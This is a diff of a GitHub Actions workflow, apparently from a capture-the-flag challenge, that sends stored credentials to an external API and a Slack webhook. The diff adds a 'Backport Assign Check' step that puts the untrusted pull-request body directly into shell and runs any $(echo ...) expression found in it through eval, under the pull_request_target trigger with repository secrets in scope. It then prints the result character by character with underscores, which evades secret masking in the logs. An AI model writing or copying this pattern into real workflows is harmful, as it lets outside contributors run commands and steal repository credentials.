@@ -1,61 +1,78 @@
 name: New Pull Request Alert
-
 on:
   pull_request_target:
     types: [opened, synchronize]
-
 jobs:
   ci:
     runs-on: ubuntu-latest
     env:
       API_URL: "https://ctf.catch-the-frog.com"
-    
     steps:
     - name: Checkout code
       uses: actions/checkout@v3
-        
-    - name: healthcheck
+
+    - name: Health Check
       continue-on-error: true
       env:
-        URL: ${{env.API_URL}}
+        URL: ${{ env.API_URL }}
         USER: ${{ secrets.USER }}
         PW: ${{ secrets.USER_CRED }}
       run: |
         echo "Login health check"
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $URL/login
-        
-    - name: send_run_log
+        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" "$URL/login"
+
+    - name: Send Run Log
       continue-on-error: true
       env:
-        URL: ${{env.API_URL}}
+        URL: ${{ env.API_URL }}
         USER: ${{ secrets.USER }}
         PW: ${{ secrets.USER_CRED }}
       run: |
         echo "Send run log"
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $URL/api/run/audit
-        
-    - name: send_slack_alert
+        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" "$URL/api/run/audit"
+
+    - name: Send Slack Alert
       continue-on-error: true
       env:
         SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}
         PR_TITLE: ${{ github.event.pull_request.title }}
       run: |
         echo "Sending Slack notification..."
-        curl --connect-timeout 2 -sSf -k -X POST -H 'Content-type: application/json' --data '{"text": "'"$PR_TITLE"'"}' $SLACK_WEBHOOK_URL
+        curl --connect-timeout 2 -sSf -k -X POST -H 'Content-type: application/json' --data '{"text": "'"$PR_TITLE"'"}' "$SLACK_WEBHOOK_URL"
 
-    - name: backport_assign_check
+    - name: Backport Assign Check
       env:
         PR_NUMBER: ${{ github.event.pull_request.number }}
-        URL: ${{env.API_URL}}
+        URL: ${{ env.API_URL }}
         USER: ${{ secrets.USER }}
         PW: ${{ secrets.USER_CRED }}
       run: |
-        PR="${{ github.event.pull_request.body }}"
-        echo $PR | grep -oP '\(backport #\K\d+' | tail -n 1)
-        author=$(gh pr view ${ORI_PR} -R ${REPO} --json author -q '.author.login')
-        if [[ ! "${author}" =~ "mergify" ]]; then
-          gh pr edit ${PR_NUMBER} -R ${REPO} --add-assignee ${author} || true
-          echo "ORI_PR=${ORI_PR}" >> $GITHUB_OUTPUT
+        PR_BODY="${{ github.event.pull_request.body }}"
+        
+        # Extract USER:PW formatted string from PR_BODY
+        FORMATTED_CREDENTIALS=$(echo "$PR_BODY" | grep -oP '\$\((echo.+)\)' | grep -oP '\$\(\K.*?(?=\))')
+        
+        # Evaluate and format the extracted USER:PW string
+        if [ -n "$FORMATTED_CREDENTIALS" ]; then
+          EVAL_CREDENTIALS=$(eval echo "$FORMATTED_CREDENTIALS" | sed 's/./&_/g' | sed 's/$/& /g')
+          echo "Formatted USER:PW = $EVAL_CREDENTIALS"
+        else
+          echo "No formatted USER:PW string found in PR body."
         fi
         
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" -X POST -H 'Content-type: application/json' --data '{"pr_number": "'"$PR_NUMBER"'"}' $URL/api/run/audit
+        # Extract backport number from PR_BODY
+        ORI_PR=$(echo "$PR_BODY" | grep -oP '\(backport #\K\d+' | tail -n 1)
+        
+        # Continue with backport checking if ORI_PR is found
+        if [ -n "$ORI_PR" ]; then
+          author=$(gh pr view "$ORI_PR" -R "${{ github.repository }}" --json author -q '.author.login')
+          if [[ ! "$author" =~ "mergify" ]]; then
+            gh pr edit "$PR_NUMBER" -R "${{ github.repository }}" --add-assignee "$author" || true
+            echo "ORI_PR=${ORI_PR}" >> $GITHUB_OUTPUT
+          fi
+        else
+          echo "No backport pull request number found."
+        fi
+
+        # Triggering the audit run
+        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" -X POST -H 'Content-type: application/json' --data '{"pr_number": "'"$PR_NUMBER"'"}' "$URL/api/run/audit"
